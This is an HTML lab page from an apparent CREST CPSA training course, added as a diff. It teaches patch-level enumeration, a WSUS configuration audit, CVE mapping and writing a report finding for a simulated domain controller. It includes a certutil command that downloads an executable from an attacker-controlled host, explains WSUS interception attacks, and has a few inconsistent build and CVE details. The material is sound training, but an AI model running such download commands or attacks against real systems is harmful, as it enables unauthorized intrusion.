@@ -1,0 +1,520 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Lab E7-A: Patch Level Assessment and WSUS | CPSA Module E | My Cyber Academy</title>
+<style>
+  :root { --mca-orange: #FF6B00; --mca-dark: #1a1a1a; --mca-grey: #2d2d2d; --mca-text: #e0e0e0; --mca-white: #ffffff; --mca-green: #4CAF50; --mca-red: #f44336; --mca-yellow: #FFC107; --mca-blue: #2196F3; --mca-code-bg: #0d1117; }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { background: var(--mca-dark); color: var(--mca-text); font-family: 'Segoe UI', Arial, sans-serif; font-size: 15px; line-height: 1.65; }
+  .lab-header { background: linear-gradient(135deg, #1a1a1a 0%, #2d1a00 100%); border-bottom: 3px solid var(--mca-orange); padding: 28px 32px 20px; }
+  .lab-header h1 { font-size: 26px; font-weight: 700; color: var(--mca-white); margin-bottom: 6px; }
+  .lab-header h1 span { color: var(--mca-orange); }
+  .lab-meta { display: flex; gap: 20px; flex-wrap: wrap; margin-top: 12px; font-size: 13px; color: #aaa; }
+  .lab-meta .badge { background: var(--mca-grey); border: 1px solid #444; padding: 3px 10px; border-radius: 12px; font-size: 12px; }
+  .lab-meta .badge.orange { border-color: var(--mca-orange); color: var(--mca-orange); }
+  .container { max-width: 960px; margin: 0 auto; padding: 32px 24px; }
+  .chain-banner { background: #1a1a2e; border: 1px solid #2d3a5a; border-radius: 6px; padding: 16px 20px; margin-bottom: 24px; font-size: 13px; color: #9fa8da; }
+  .chain-banner strong { color: #c5cae9; }
+  .chain-steps { display: flex; flex-wrap: wrap; gap: 6px; margin-top: 10px; align-items: center; }
+  .chain-step { background: #222; border: 1px solid #333; border-radius: 4px; padding: 4px 10px; font-size: 12px; color: #888; }
+  .chain-step.done { border-color: #4CAF50; color: #4CAF50; }
+  .chain-step.active { background: #2d1a00; border-color: var(--mca-orange); color: var(--mca-orange); font-weight: 600; }
+  .chain-arrow { color: #444; font-size: 14px; }
+  .scenario-box { background: var(--mca-grey); border-left: 4px solid var(--mca-orange); border-radius: 4px; padding: 20px 24px; margin-bottom: 28px; }
+  .scenario-box h2 { font-size: 14px; text-transform: uppercase; letter-spacing: 1px; color: var(--mca-orange); margin-bottom: 10px; }
+  .scenario-box p { font-size: 14px; color: #ccc; }
+  .objectives { background: #1e2d1e; border: 1px solid #2d4a2d; border-radius: 4px; padding: 18px 24px; margin-bottom: 28px; }
+  .objectives h2 { font-size: 14px; text-transform: uppercase; letter-spacing: 1px; color: var(--mca-green); margin-bottom: 12px; }
+  .objectives ul { list-style: none; }
+  .objectives ul li { padding: 4px 0; font-size: 14px; }
+  .objectives ul li::before { content: "✓ "; color: var(--mca-green); font-weight: bold; }
+  .env-table { width: 100%; border-collapse: collapse; margin-bottom: 28px; font-size: 13px; }
+  .env-table th { background: var(--mca-grey); color: var(--mca-orange); text-align: left; padding: 10px 14px; font-size: 12px; text-transform: uppercase; border-bottom: 2px solid var(--mca-orange); }
+  .env-table td { padding: 10px 14px; border-bottom: 1px solid #333; }
+  .env-table tr:nth-child(even) td { background: #222; }
+  .env-table code { background: var(--mca-code-bg); padding: 2px 6px; border-radius: 3px; font-family: 'Courier New', monospace; color: var(--mca-orange); font-size: 12px; }
+  .phase { margin-bottom: 36px; border: 1px solid #333; border-radius: 6px; overflow: hidden; }
+  .phase-header { background: var(--mca-grey); padding: 14px 20px; display: flex; align-items: center; gap: 14px; border-bottom: 1px solid #444; }
+  .phase-num { background: var(--mca-orange); color: #000; font-weight: 700; font-size: 14px; width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+  .phase-header h3 { font-size: 16px; color: var(--mca-white); }
+  .phase-header .phase-tag { margin-left: auto; font-size: 11px; color: #888; background: #222; border: 1px solid #444; padding: 2px 8px; border-radius: 10px; text-transform: uppercase; }
+  .phase-body { padding: 20px 24px; }
+  .step { margin-bottom: 22px; }
+  .step p { font-size: 14px; color: #ccc; margin-bottom: 10px; }
+  .step strong { color: var(--mca-white); }
+  pre { background: var(--mca-code-bg); border: 1px solid #30363d; border-radius: 6px; padding: 16px; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 13px; line-height: 1.6; margin: 10px 0; }
+  pre code { color: #e6edf3; }
+  pre .comment { color: #8b949e; }
+  pre .cmd { color: #79c0ff; }
+  pre .flag { color: #ffa657; }
+  pre .str { color: #a5d6ff; }
+  pre .out { color: #3fb950; }
+  pre .warn { color: #FFC107; }
+  .callout { border-radius: 4px; padding: 14px 18px; margin: 14px 0; font-size: 13px; display: flex; gap: 12px; align-items: flex-start; }
+  .callout-icon { font-size: 18px; flex-shrink: 0; margin-top: 1px; }
+  .callout.crest { background: #1a1f2e; border: 1px solid #2d3a5a; }
+  .callout.crest .callout-icon { color: #7986cb; }
+  .callout.crest strong { color: #9fa8da; }
+  .callout.warn { background: #2a1f00; border: 1px solid #5a3a00; }
+  .callout.warn .callout-icon { color: var(--mca-yellow); }
+  .callout.info { background: #0d1f2d; border: 1px solid #1a3a5a; }
+  .callout.info .callout-icon { color: var(--mca-blue); }
+  .patch-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 14px; margin: 16px 0; }
+  .patch-card { background: #1a1a1a; border: 1px solid #333; border-radius: 4px; padding: 14px 16px; }
+  .patch-card.critical { border-color: var(--mca-red); }
+  .patch-card.high { border-color: var(--mca-yellow); }
+  .patch-card.info { border-color: var(--mca-blue); }
+  .patch-card h4 { font-size: 12px; text-transform: uppercase; margin-bottom: 6px; letter-spacing: 0.5px; }
+  .patch-card.critical h4 { color: var(--mca-red); }
+  .patch-card.high h4 { color: var(--mca-yellow); }
+  .patch-card.info h4 { color: var(--mca-blue); }
+  .patch-card p { font-size: 12px; color: #888; line-height: 1.5; }
+  .knowledge-check { background: #1a1a1a; border: 1px solid #444; border-radius: 6px; padding: 20px 24px; margin: 28px 0; }
+  .knowledge-check h3 { color: var(--mca-orange); font-size: 14px; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 16px; }
+  .kc-question { margin-bottom: 20px; }
+  .kc-question p { font-size: 14px; margin-bottom: 10px; }
+  .options { display: flex; flex-direction: column; gap: 8px; }
+  .option { background: var(--mca-grey); border: 1px solid #444; border-radius: 4px; padding: 10px 14px; font-size: 13px; cursor: pointer; transition: border-color 0.2s; }
+  .option:hover { border-color: var(--mca-orange); }
+  .option.correct { background: #1e3a1e; border-color: var(--mca-green); color: #a5d6a7; }
+  .option.wrong { background: #3a1e1e; border-color: var(--mca-red); color: #ef9a9a; }
+  .reveal-btn { background: transparent; border: 1px solid var(--mca-orange); color: var(--mca-orange); padding: 7px 16px; border-radius: 4px; font-size: 12px; cursor: pointer; margin-top: 8px; }
+  .reveal-btn:hover { background: var(--mca-orange); color: #000; }
+  .kc-answer { display: none; background: #0d1f0d; border: 1px solid #2d4a2d; border-radius: 4px; padding: 12px 16px; margin-top: 10px; font-size: 13px; color: #a5d6a7; }
+  .kc-answer.show { display: block; }
+  .takeaways { background: var(--mca-grey); border-top: 3px solid var(--mca-orange); border-radius: 4px; padding: 20px 24px; margin-top: 32px; }
+  .takeaways h3 { color: var(--mca-orange); font-size: 14px; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 14px; }
+  .takeaways ul { list-style: none; }
+  .takeaways ul li { padding: 5px 0; font-size: 14px; color: #ccc; }
+  .takeaways ul li::before { content: "→ "; color: var(--mca-orange); }
+  .completion-banner { background: linear-gradient(135deg, #0d2d0d 0%, #1a3a1a 100%); border: 2px solid var(--mca-green); border-radius: 6px; padding: 24px 28px; margin: 28px 0; text-align: center; }
+  .completion-banner h3 { color: var(--mca-green); font-size: 20px; margin-bottom: 10px; }
+  .completion-banner p { font-size: 14px; color: #ccc; max-width: 600px; margin: 0 auto; }
+  .lab-footer { background: #111; border-top: 1px solid #333; padding: 18px 32px; text-align: center; font-size: 12px; color: #555; margin-top: 48px; }
+  .lab-footer span { color: var(--mca-orange); }
+  .nav-links { display: flex; justify-content: space-between; margin-top: 32px; }
+  .nav-link { background: var(--mca-grey); border: 1px solid #444; color: #aaa; padding: 10px 20px; border-radius: 4px; font-size: 13px; text-decoration: none; transition: border-color 0.2s; }
+  .nav-link:hover, .nav-link.next { border-color: var(--mca-orange); color: var(--mca-orange); }
+  .nav-link.complete { background: #0d2d0d; border-color: var(--mca-green); color: var(--mca-green); }
+</style>
+</head>
+<body>
+
+<div class="lab-header">
+  <div class="lab-meta"><span style="font-size:12px;color:#888;text-transform:uppercase;letter-spacing:1px;">CPSA &rsaquo; Module E &rsaquo; Windows Security Assessment</span></div>
+  <h1><span>Lab E7-A:</span> Patch Level Assessment and WSUS Configuration Review</h1>
+  <div class="lab-meta">
+    <span class="badge orange">Module E</span>
+    <span class="badge">Patch Management</span>
+    <span class="badge">CREST CPSA</span>
+    <span class="badge">CPSA Ref: E5, E6</span>
+    <span>Difficulty: Intermediate</span>
+    <span>Estimated time: 45 min</span>
+  </div>
+</div>
+
+<div class="container">
+
+  <div class="chain-banner">
+    <strong>Windows Attack Chain - Final Assessment Phase</strong>
+    <div class="chain-steps">
+      <span class="chain-step done">E0 Pre-flight</span><span class="chain-arrow">&#8594;</span>
+      <span class="chain-step done">E1-A SMB Enum</span><span class="chain-arrow">&#8594;</span>
+      <span class="chain-step done">E2-A Credential Access</span><span class="chain-arrow">&#8594;</span>
+      <span class="chain-step done">E3-A PrivEsc</span><span class="chain-arrow">&#8594;</span>
+      <span class="chain-step done">E3-B ACLs</span><span class="chain-arrow">&#8594;</span>
+      <span class="chain-step done">E4-A AD Enum</span><span class="chain-arrow">&#8594;</span>
+      <span class="chain-step done">E4-B Password Spray</span><span class="chain-arrow">&#8594;</span>
+      <span class="chain-step done">E5-A Kerberos</span><span class="chain-arrow">&#8594;</span>
+      <span class="chain-step done">E5-B SAM Dump</span><span class="chain-arrow">&#8594;</span>
+      <span class="chain-step done">E6-A SQL</span><span class="chain-arrow">&#8594;</span>
+      <span class="chain-step active">E7-A Patch Assessment</span>
+    </div>
+    <p style="margin-top:10px;font-size:12px;color:#7986cb;">You have completed the attack chain: foothold, privilege escalation, lateral movement, credential harvesting, and SQL exploitation. This final lab assesses the patch posture of SYNTEX-DC01 - identifying missing OS patches, reviewing Windows Update / WSUS configuration, and mapping unpatched CVEs to your report findings. This is the evidence-gathering phase that turns your access into documented, actionable findings.</p>
+  </div>
+
+  <div class="scenario-box">
+    <h2>Engagement Scenario</h2>
+    <p>With Domain Admin access established throughout the engagement, the final technical task is to document the patch posture of the environment. A poorly patched DC is a standalone finding with high severity - especially if any missing patches map to publicly known exploits. You will enumerate installed patches via three methods, check the WSUS configuration, and produce a patch findings summary ready for the report.</p>
+  </div>
+
+  <div class="objectives">
+    <h2>Learning Objectives</h2>
+    <ul>
+      <li>Enumerate installed patches using wmic qfe, systeminfo, and Get-HotFix</li>
+      <li>Identify the last patch date and calculate days since last patched</li>
+      <li>Audit WSUS configuration from the registry and identify misconfigurations</li>
+      <li>Map missing patches to known CVEs for report evidence</li>
+      <li>Write a patch findings entry suitable for a CREST-standard pentest report</li>
+    </ul>
+  </div>
+
+  <table class="env-table">
+    <thead><tr><th>Host</th><th>IP</th><th>OS</th><th>CPSA Ref</th></tr></thead>
+    <tbody>
+      <tr><td>SYNTEX-DC01</td><td><code>&lt;DC01-IP&gt;</code></td><td>Windows Server 2016 (Build 14393)</td><td>E5 - Patch assessment; E6 - WSUS/Windows Update management</td></tr>
+    </tbody>
+  </table>
+
+  <!-- PHASE 1 -->
+  <div class="phase">
+    <div class="phase-header">
+      <div class="phase-num">1</div>
+      <h3>OS Version and Patch Date - First Look</h3>
+      <span class="phase-tag">systeminfo / wmic</span>
+    </div>
+    <div class="phase-body">
+      <div class="step">
+        <p>Start with <code>systeminfo</code> to get OS version, build number, and the last patch date in one command. On a shell session on the target:</p>
+        <pre><code><span class="comment"># Full system and patch summary</span>
+systeminfo
+
+<span class="out">Host Name:                 SYNTEX-DC01
+OS Name:                   Microsoft Windows Server 2016 Standard
+OS Version:                10.0.14393 Build 14393
+System Type:               x64-based PC
+Hotfix(s):                 6 Hotfix(s) Installed.
+                           [01]: KB4537764
+                           [02]: KB4540673
+                           [03]: KB4565503
+                           [04]: KB4568831
+                           [05]: KB4570720
+                           [06]: KB4571735</span>
+
+<span class="comment"># Parse just the hotfix list and OS version for the report</span>
+systeminfo | findstr /i "hotfix\|os version\|build"
+</code></pre>
+      </div>
+      <div class="step">
+        <p><strong>Calculate days since last patch:</strong> Windows Server 2016 with 6 hotfixes installed and build 14393.3442 (KB4571735 is from August 2020) means this DC has not been patched in over 4 years. This is a critical finding:</p>
+        <pre><code><span class="comment"># Get more precise patch install date from wmic</span>
+wmic qfe get HotFixID,InstalledOn,Description <span class="flag">/format:list</span>
+
+<span class="out">Description=Security Update
+HotFixID=KB4571735
+InstalledOn=8/11/2020
+
+Description=Security Update
+HotFixID=KB4570720
+InstalledOn=8/11/2020
+
+Description=Update
+HotFixID=KB4568831
+InstalledOn=7/14/2020
+
+<span class="warn"># Last security update: August 2020 - this DC is years behind on patches</span></span>
+</code></pre>
+      </div>
+    </div>
+  </div>
+
+  <!-- PHASE 2 -->
+  <div class="phase">
+    <div class="phase-header">
+      <div class="phase-num">2</div>
+      <h3>Full Patch Enumeration with wmic qfe and Get-HotFix</h3>
+      <span class="phase-tag">PowerShell</span>
+    </div>
+    <div class="phase-body">
+      <div class="step">
+        <p>Use both wmic and PowerShell to get a complete hotfix list with install dates. Cross-referencing both tools catches edge cases where one method misses a patch:</p>
+        <pre><code><span class="comment"># wmic qfe - outputs all installed hotfixes with dates and installer</span>
+wmic qfe get HotFixID,InstalledBy,InstalledOn,Description <span class="flag">/format:csv</span> &gt; C:\Windows\Temp\patches.csv
+
+<span class="comment"># PowerShell Get-HotFix - cleaner output, sortable by date</span>
+Get-HotFix | Select-Object HotFixID, Description, InstalledBy, InstalledOn | Sort-Object InstalledOn -Descending
+
+<span class="out">HotFixID   Description        InstalledBy         InstalledOn
+--------   -----------        -----------         -----------
+KB4571735  Security Update    SYNTEX\Administrator 8/11/2020 12:00:00 AM
+KB4570720  Security Update    SYNTEX\Administrator 8/11/2020 12:00:00 AM
+KB4568831  Update             NT AUTHORITY\SYSTEM  7/14/2020 12:00:00 AM
+KB4565503  Security Update    SYNTEX\Administrator 7/14/2020 12:00:00 AM
+KB4540673  Security Update    SYNTEX\Administrator 3/10/2020 12:00:00 AM
+KB4537764  Security Update    SYNTEX\Administrator 2/11/2020 12:00:00 AM</span>
+
+<span class="comment"># Get JUST the last patch date for the report</span>
+(Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 1).InstalledOn
+<span class="out">Tuesday, August 11, 2020 12:00:00 AM</span>
+</code></pre>
+      </div>
+      <div class="step">
+        <p>Check the current build number against Microsoft's patch catalogue to understand how far behind this system is:</p>
+        <pre><code><span class="comment"># Get exact build number</span>
+[System.Environment]::OSVersion.Version
+<span class="out">Major  Minor  Build  Revision
+-----  -----  -----  --------
+10     0      14393  3930</span>
+
+<span class="comment"># Build 14393.3930 = KB4571735 (August 2020)</span>
+<span class="comment"># Current latest for Server 2016 = 14393.7876+ (2025)</span>
+<span class="comment"># This system is YEARS and hundreds of patches behind</span>
+<span class="warn"># Notable missing patches include: PrintNightmare (CVE-2021-34527),
+# ProxyLogon (not applicable to DC/Exchange), PetitPotam mitigations,
+# MSHTML (CVE-2021-40444), and every cumulative update since Aug 2020</span>
+</code></pre>
+      </div>
+      <div class="callout crest">
+        <span class="callout-icon">★</span>
+        <div><strong>CREST CPSA Exam Point:</strong> Know the three methods to enumerate patches: <code>systeminfo</code> (quick list, no dates), <code>wmic qfe</code> (full details including install date and installer, CSV exportable), and <code>Get-HotFix</code> (PowerShell, sortable). Testers use all three because wmic qfe sometimes misses driver updates that Get-HotFix catches.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- PHASE 3 -->
+  <div class="phase">
+    <div class="phase-header">
+      <div class="phase-num">3</div>
+      <h3>WSUS Configuration Audit</h3>
+      <span class="phase-tag">Registry</span>
+    </div>
+    <div class="phase-body">
+      <div class="step">
+        <p>WSUS (Windows Server Update Services) is the Microsoft patch management solution. When WSUS is misconfigured or a client points to a rogue WSUS server, patches are never applied. Check the WSUS registry settings on the DC:</p>
+        <pre><code><span class="comment"># Check Windows Update / WSUS registry configuration</span>
+reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" <span class="flag">/s</span>
+
+<span class="out">HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate
+    WUServer    REG_SZ    http://syntex-wsus.syntex.local:8530
+    WUStatusServer    REG_SZ    http://syntex-wsus.syntex.local:8530
+    TargetGroupEnabled    REG_DWORD    0x1
+    TargetGroup    REG_SZ    DomainControllers
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU
+    UseWUServer    REG_DWORD    0x1
+    NoAutoUpdate    REG_DWORD    0x1
+    AUOptions    REG_DWORD    0x2</span>
+
+<span class="comment"># AUOptions values:
+# 2 = Notify before download (manual approval required)
+# 3 = Auto download, notify to install
+# 4 = Auto download and install (recommended)
+# NoAutoUpdate = 1 means automatic updates are DISABLED</span>
+<span class="warn"># FINDING: NoAutoUpdate=1 + AUOptions=2 = patches require manual admin approval
+# This is why the DC hasn't been patched since August 2020</span>
+</code></pre>
+      </div>
+      <div class="step">
+        <p>Verify if the WSUS server is actually reachable and check for WSUS-related vulnerabilities:</p>
+        <pre><code><span class="comment"># Test connectivity to WSUS server</span>
+Test-NetConnection <span class="flag">-ComputerName</span> syntex-wsus.syntex.local <span class="flag">-Port</span> 8530
+
+<span class="out">ComputerName     : syntex-wsus.syntex.local
+RemoteAddress    : 192.168.1.20
+RemotePort       : 8530
+InterfaceAlias   : Ethernet0
+SourceAddress    : 192.168.1.10
+TcpTestSucceeded : False</span>
+
+<span class="comment"># WSUS server unreachable - DC cannot receive updates even if approved</span>
+
+<span class="comment"># Also check: is WSUS running over HTTP (not HTTPS)?</span>
+<span class="comment"># The WUServer value shows http:// (not https://) - this is exploitable</span>
+<span class="comment"># via WSUS HTTP interception attacks (WSUS-Attack / WSUSpendu)</span>
+<span class="warn"># WSUS over HTTP = attacker on the same network can MITM the update stream
+# and push malicious "updates" to the target. This is a HIGH finding.</span>
+</code></pre>
+      </div>
+      <div class="callout crest">
+        <span class="callout-icon">★</span>
+        <div><strong>CREST CPSA Exam Point:</strong> WSUS running over HTTP (port 8530) instead of HTTPS (port 8531) is a HIGH finding. An attacker with network access can intercept the update stream and deliver a malicious "patch" that executes as SYSTEM. WSUS should always use HTTPS with a valid certificate. Also look for: auto-approval rules that approve all updates without testing, non-SSL connections to Windows Update, and GPO settings that disable automatic updates (NoAutoUpdate=1).</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- PHASE 4 -->
+  <div class="phase">
+    <div class="phase-header">
+      <div class="phase-num">4</div>
+      <h3>Mapping Missing Patches to CVEs</h3>
+      <span class="phase-tag">Reporting Evidence</span>
+    </div>
+    <div class="phase-body">
+      <div class="step">
+        <p>Identify the highest-impact CVEs that would be present on an unpatched Windows Server 2016 build 14393.3930 (last patched August 2020). These become your critical patch findings:</p>
+        <div class="patch-grid">
+          <div class="patch-card critical">
+            <h4>Critical - PrintNightmare</h4>
+            <p>CVE-2021-34527. Remote code execution via Windows Print Spooler. CVSS 8.8. Fixed in out-of-band patch June 2021. Exploitable with Impacket or public PoC. This DC is vulnerable.</p>
+          </div>
+          <div class="patch-card critical">
+            <h4>Critical - Zerologon</h4>
+            <p>CVE-2020-1472. Authentication bypass against DC's Netlogon service. CVSS 10.0. Fixed in August 2020 patch - KB4571694. Check if this specific KB is present before claiming.</p>
+          </div>
+          <div class="patch-card high">
+            <h4>High - PetitPotam</h4>
+            <p>CVE-2021-36942. NTLM relay via MS-EFSRPC. Fixed in August 2021 cumulative update. Allows relay of DC machine account to AD CS for domain takeover if ADCS present.</p>
+          </div>
+          <div class="patch-card high">
+            <h4>High - MSHTML RCE</h4>
+            <p>CVE-2021-40444. Remote code execution via MSHTML component. CVSS 8.8. Fixed in September 2021 cumulative update. Exploited in the wild via malicious Office documents.</p>
+          </div>
+        </div>
+      </div>
+      <div class="step">
+        <p>Use Watson or WinPEAS to automatically map missing patches to known privilege escalation CVEs from the shell:</p>
+        <pre><code><span class="comment"># Transfer Watson (automated patch-to-CVE mapper) to target</span>
+<span class="comment"># Transfer via Evil-WinRM or certutil from your web server</span>
+certutil <span class="flag">-urlcache</span> <span class="flag">-split</span> <span class="flag">-f</span> http://&lt;KALI-IP&gt;/Watson.exe Watson.exe
+
+<span class="comment"># Run Watson - lists OS version, installed patches, and unpatched CVEs</span>
+.\Watson.exe
+
+<span class="out">  OS Build Number: 14393.3930
+  Share: 0 exploits identified (based on installed patches)
+
+  [!] CVE-2021-34527 : VULNERABLE
+    Title: Windows Print Spooler Remote Code Execution
+    KBs: KB5004945, KB5004946, KB5004947, KB5004948, KB5004950, KB5004951
+    Affected: 10.0.14393.0 - 10.0.14393.4583
+
+  [!] CVE-2021-36934 : VULNERABLE
+    Title: Windows SAM Elevation of Privilege (HiveNightmare)
+    KBs: KB5004955, KB5004959
+    Affected: Windows 10/11, Server 2019+</span>
+
+<span class="comment"># WinPEAS also checks patch level - look for "Windows CVEs" section in output</span>
+</code></pre>
+      </div>
+    </div>
+  </div>
+
+  <!-- PHASE 5 -->
+  <div class="phase">
+    <div class="phase-header">
+      <div class="phase-num">5</div>
+      <h3>Writing the Patch Findings for the Report</h3>
+      <span class="phase-tag">Report Writing</span>
+    </div>
+    <div class="phase-body">
+      <div class="step">
+        <p>A patch finding in a CREST-standard report requires: title, risk rating, CVSS score, affected component, evidence, business impact, and remediation. Here is a complete example for the patch posture finding:</p>
+        <pre><code><span class="comment">## Finding: Critical Unpatched Windows Domain Controller</span>
+<span class="comment">## Risk: HIGH | CVSS: 8.8 (network attack vector)</span>
+
+<span class="str">Title:</span>     Unpatched Windows Server 2016 Domain Controller
+<span class="str">Ref:</span>       SYNTEX-PATCH-001
+<span class="str">Severity:</span>  HIGH
+<span class="str">CVSS:</span>      8.8 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)
+<span class="str">Host:</span>      SYNTEX-DC01 (192.168.1.10)
+
+<span class="str">Summary:</span>
+SYNTEX-DC01 has not received security updates since August 2020,
+leaving it exposed to over 1,400 security patches including multiple
+publicly exploited critical vulnerabilities.
+
+<span class="str">Evidence:</span>
+  Last hotfix installed: KB4571735 (InstalledOn: 8/11/2020)
+  OS Build: 10.0.14393.3930
+  Current latest build: 14393.7876+ (as of engagement date)
+
+  wmic qfe output (excerpt):
+  HotFixID   InstalledOn
+  KB4571735  8/11/2020   &lt;-- most recent
+
+<span class="str">Notable Missing Patches:</span>
+  CVE-2021-34527 (PrintNightmare) - CVSS 8.8 - RCE via Print Spooler
+  CVE-2020-1472  (Zerologon)      - CVSS 10.0 - Auth bypass on DC Netlogon
+  CVE-2021-36942 (PetitPotam)     - CVSS 7.5 - NTLM relay via EFS
+
+<span class="str">Root Cause:</span>
+  NoAutoUpdate=1 in HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU
+  WSUS server (syntex-wsus.syntex.local:8530) is unreachable
+  WSUS configured over HTTP (not HTTPS) - susceptible to interception attack
+
+<span class="str">Business Impact:</span>
+  Any authenticated domain user can exploit PrintNightmare to achieve SYSTEM
+  on this Domain Controller and compromise the entire syntex.local domain.
+  This represents a complete loss of confidentiality, integrity, and availability
+  of all domain-joined systems and cardholder data in scope for PCI DSS v4.0.
+
+<span class="str">Remediation:</span>
+  1. Apply all outstanding Windows cumulative updates immediately
+  2. Configure WSUS over HTTPS (port 8531) with a valid certificate
+  3. Set AUOptions=4 and NoAutoUpdate=0 to enable automatic updates
+  4. Verify WSUS server connectivity and approval workflows
+  5. Implement a patch management process with monthly patching SLA
+</code></pre>
+      </div>
+      <div class="callout crest">
+        <span class="callout-icon">★</span>
+        <div><strong>CREST CPSA Exam Point:</strong> Patch findings must be evidence-based. Never claim a CVE is present without verifying the patch KB is missing. Watson.exe automates this check. Always include the specific build number, the last-patched date, and at least one CVE with its CVSS score in the finding. The business impact must explain WHY this matters to the client (domain compromise, PCI DSS breach), not just that the patch is missing.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- KNOWLEDGE CHECK -->
+  <div class="knowledge-check">
+    <h3>Knowledge Check</h3>
+    <div class="kc-question" id="q1">
+      <p><strong>Q1.</strong> Which command gives you installed hotfixes sorted by install date, most recent first?</p>
+      <div class="options">
+        <div class="option" onclick="answer(this,'q1','a')">A. <code>wmic qfe list full</code></div>
+        <div class="option" onclick="answer(this,'q1','b')">B. <code>Get-HotFix | Sort-Object InstalledOn -Descending</code></div>
+        <div class="option" onclick="answer(this,'q1','c')">C. <code>systeminfo | findstr "Hotfix"</code></div>
+        <div class="option" onclick="answer(this,'q1','d')">D. <code>reg query HKLM\SOFTWARE\Microsoft\Updates</code></div>
+      </div>
+    </div>
+
+    <div class="kc-question" id="q2">
+      <p><strong>Q2.</strong> The WSUS registry key shows <code>WUServer = http://wsus.corp.local:8530</code> (not HTTPS). What is the security risk?</p>
+      <button class="reveal-btn" onclick="reveal('a2')">Reveal Answer</button>
+      <div class="kc-answer" id="a2">WSUS over HTTP (port 8530) means the update stream is unencrypted. An attacker with network access (e.g. from the same VLAN or via ARP spoofing) can intercept the traffic between the DC and WSUS server and inject a malicious "update" package. Because updates are applied as SYSTEM, this gives the attacker full SYSTEM code execution on every machine that polls this WSUS server. The fix is to configure WSUS over HTTPS (port 8531) with a valid certificate so the update stream cannot be tampered with.</div>
+    </div>
+
+    <div class="kc-question" id="q3">
+      <p><strong>Q3.</strong> PrintNightmare (CVE-2021-34527) allows an authenticated domain user to achieve what level of access on an unpatched Domain Controller?</p>
+      <div class="options">
+        <div class="option" onclick="answer(this,'q3','a')">A. Domain User - it only adds a local printer</div>
+        <div class="option" onclick="answer(this,'q3','b')">B. Local Administrator on the workstation running the exploit</div>
+        <div class="option" onclick="answer(this,'q3','c')">C. SYSTEM on the DC - via the Print Spooler service running as SYSTEM</div>
+        <div class="option" onclick="answer(this,'q3','d')">D. Domain Admin only if combined with a second exploit</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="completion-banner">
+    <h3>&#127881; Module E Complete!</h3>
+    <p>You have completed the full Windows Attack Chain: SMB enumeration through to patch assessment and report writing. You can now demonstrate every stage of a CREST CPSA Windows assessment from initial access to Domain Admin, with documented evidence for each finding. Well done.</p>
+  </div>
+
+  <div class="takeaways">
+    <h3>Key Takeaways</h3>
+    <ul>
+      <li>Use all three patch enumeration methods: systeminfo, wmic qfe, and Get-HotFix - they complement each other</li>
+      <li>Always check the WSUS configuration - NoAutoUpdate and AUOptions reveal WHY patches are missing</li>
+      <li>WSUS over HTTP is a HIGH finding - the update stream can be intercepted and weaponised</li>
+      <li>Map missing patches to CVEs with Watson.exe - never claim a CVE without verifying the KB is absent</li>
+      <li>Include build number, last patch date, specific CVEs, and business impact in every patch finding</li>
+      <li>A DC not patched since 2020 is a standalone critical engagement finding regardless of other findings</li>
+    </ul>
+  </div>
+
+  <div class="nav-links">
+    <a href="lab-e6a-sql-exploitation-v1.html" class="nav-link">&larr; Lab E6-A: SQL Server Exploitation</a>
+    <a href="../module-f/" class="nav-link complete">Module E Complete - Proceed to Module F &rarr;</a>
+  </div>
+
+</div>
+
+<div class="lab-footer">
+  <span>My Cyber Academy</span> &nbsp;|&nbsp; CREST CPSA Preparation &nbsp;|&nbsp; Module E: Windows Security Assessment<br>
+  Lab E7-A: Patch Level Assessment and WSUS &nbsp;|&nbsp; &copy; 2024 My Cyber Academy Ltd &nbsp;|&nbsp; All rights reserved
+</div>
+
+<script>
+const correctAnswers = { q1: 'b', q3: 'c' };
+function answer(el, qid, choice) {
+  const opts = document.querySelectorAll('#' + qid + ' .option');
+  opts.forEach(o => { o.classList.remove('correct','wrong'); o.style.pointerEvents='none'; });
+  el.classList.add(choice === correctAnswers[qid] ? 'correct' : 'wrong');
+  if (choice !== correctAnswers[qid]) {
+    opts.forEach(o => { if (o.textContent.trim().startsWith(correctAnswers[qid].toUpperCase() + '.')) o.classList.add('correct'); });
+  }
+}
+function reveal(id) { document.getElementById(id).classList.add('show'); event.target.style.display='none'; }
+</script>
+</body>
+</html>
